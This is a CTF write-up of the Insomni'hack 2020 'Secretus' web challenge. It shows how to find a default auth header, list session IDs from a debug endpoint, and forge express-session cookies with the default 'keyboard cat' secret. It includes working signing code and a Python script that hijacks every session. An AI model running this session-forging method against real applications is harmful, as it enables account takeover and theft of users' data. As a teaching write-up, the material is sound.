---
title: "Insomni'hack teaser 2020 - Secretus (Web)"
date: 2020-01-20T13:37:00+01:00
author: "evilet"
description: "Writeup of the challenge 'secretus'@Insomnia'hack teaser 2020"
---
***TL;DR***
Reusing example configurations is bad.

Secretus was a pure Web challenge which presented us with a minimal form.

![Secretus Index Page](/img/ins20_secretus1.png)

The form did actually have no purpose as there were no handlers executed upon clicking the button or
doing anything else, such as making a handstand while looking at the form. So after searching for
a quite embarassing time for the secret feature of the button or how to fix the broken form, we figured out that there were to
more endpoints from interest: **/secrets** and **/debug**.

Visiting **/secrets** presents us with the following error message: `{"error":"INVALID_API_KEY"}`.
First, we only googled for the error message itself or parts of it 
and did therefore not find the correct example page with the used code.
So some time went by with the first page, again... before looking for the complete json message 
with the exposed framkework (`X-Powered-By: Express` header) in google, to find the
following page: [express-authentication](https://www.npmjs.com/package/express-authentication).

The example code on this page returns the same value as our page, and the following part is from interest
for authentication:

```javascript
req.challenge = req.get('Authorization');
req.authenticated = req.authentication === 'secret';
```

So, if we set the header `Authorization: secret` we should be able to visit the **/secrets** endpoint:

![Secretus Valid Auth Header](/img/ins20_secretus2.png)

Voila, we found the needed header to visit the page. The **/secret** endpoint presents us with kinda the same
form as the index page, but now we are able to insert at least 3 secrets which will be shown on the page.
Interesting in this step to notice is the cookie, which is set to map the secrets to a session: **connect.sid**.
This means, that there could be a session which has a secret we need to steal.

![Secretus Secrets Page](/img/ins20_secretus3.png)

But how do we find other valid sessions? There was another endpoint: **/debug** which we kinda ignored until now, because
it only redirected us to the home page. But if we use the _Authorization_ header on this endpoint, we get the following:

![Secretus Debug Page](/img/ins20_secretus4.png)

If we compare the returned list values against our session `connect.sid=s:LRTM70yfO-cQ4ikmDBZoLa_WwSnX82te.CsRwKt7H4uL4nGe4fH/0ATRfclH9E5GhhZxVB1ufa5k;`, we can see that
the first part (after `s:` and before the first dot) is also present in the list from the **/debug** endpoint: `LRTM70yfO-cQ4ikmDBZoLa_WwSnX82te.json`.
So we got the first part of the cookie and the second part is probably some kind of signature to verify the validity of the cookie.
This time, we google for the cookie name (`connect.sid`) to find: [express-session](https://github.com/expressjs/session) which again
pretty much looks exactly like what we got as response from secretus. Looking through the code, searching with the github search
for the "sign" function reveals the following code to set the cookie:

```javascript
function setcookie(res, name, val, secret, options) {
  var signed = 's:' + signature.sign(val, secret);
  var data = cookie.serialize(name, signed, options);

  debug('set-cookie %s', data);

  var prev = res.getHeader('Set-Cookie') || []
  var header = Array.isArray(prev) ? prev.concat(data) : [prev, data];

  res.setHeader('Set-Cookie', header)
}
```

Interesting for us is the second part, in which the signature is created. This once again looks exactly like what we got (the "s:"
in front with the value and the signature). But where do we find the variable value **secret** for the signature? And here the "theme" of
the challenge came through, using default values. The README gile in the repository has the following example giving us the secret `keboard cat`:

```javascript
var app = express()
app.set('trust proxy', 1) // trust first proxy
app.use(session({
  secret: 'keyboard cat',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true }
}))
```

With the help of the original code, we build our own function reusing the frameworks for simplicity:

```javascript
var express = require('express');
var app = express();
var signature = require('cookie-signature')

app.get('/', function(req, res){
	console.log(req.query.yay);
	var x = 's:' + signature.sign(req.query.yay, "keyboard cat");
	res.send(x);
});

app.listen(3000);
```

This will start us an express service which expects the parameter _yay_ on a request and uses it as value for the signature.
Afterwards the complete cookie value is returned, signed and ready to use. We test it with our original session which should
return `s:LRTM70yfO-cQ4ikmDBZoLa_WwSnX82te.CsRwKt7H4uL4nGe4fH/0ATRfclH9E5GhhZxVB1ufa5k` if `LRTM70yfO-cQ4ikmDBZoLa_WwSnX82te` is given:

```bash
~ curl "127.0.0.1:3000/?yay=LRTM70yfO-cQ4ikmDBZoLa_WwSnX82te"
s:LRTM70yfO-cQ4ikmDBZoLa_WwSnX82te.CsRwKt7H4uL4nGe4fH/0ATRfclH9E5GhhZxVB1ufa5k
```

Now we can forge all existing session with the following steps:

1. Visit **/debug** and extract the list of all sessions.
2. Create valid session cookies for each extracted session.
3. Visit the **/secret** endpoint with each session cookie.
4. Look for interesting stored secrets, such as the flag.

We did these steps in Python as shown in the following:

```python
#!/usr/bin/env python3
import requests
from lxml import html

headers = {'Authorization': 'secret'}
url = "http://secretus.insomnihack.ch"

# Request the debug endpoint to retrieve all sessions
r = requests.get(f"{url}/debug", headers=headers)

# Parse sessions out of html and strip the .json in the end
# using list comprehension. List comprehension is awesome!
tree = html.fromstring(r.text)
all_sessions = [os.path.splitext(s)[0] for s in tree.xpath('//li/text()')]

# Iterate over each session value
for session in all_sessions:
		# Retrieve the full session cookie, querying our own express session service
		cookie_request = requests.get(f"http://127.0.0.1:3000/?yay={session}")

		# Set the retrieved cookie
		cookies = {"connect.sid": cookie_request.text}

		# Request the secret endpoint with our currently forges session
		get_secrets = requests.get(f"{url}/secret", headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})

		# Extract and print all secrets from current session
		tree = html.fromstring(get_secrets.text)
		secrets = tree.xpath('//li/text()')
		if secrets:
			print(secrets)
```

The script in its full action:

![Secretus flag retrieval](/img/ins20_solution.gif)
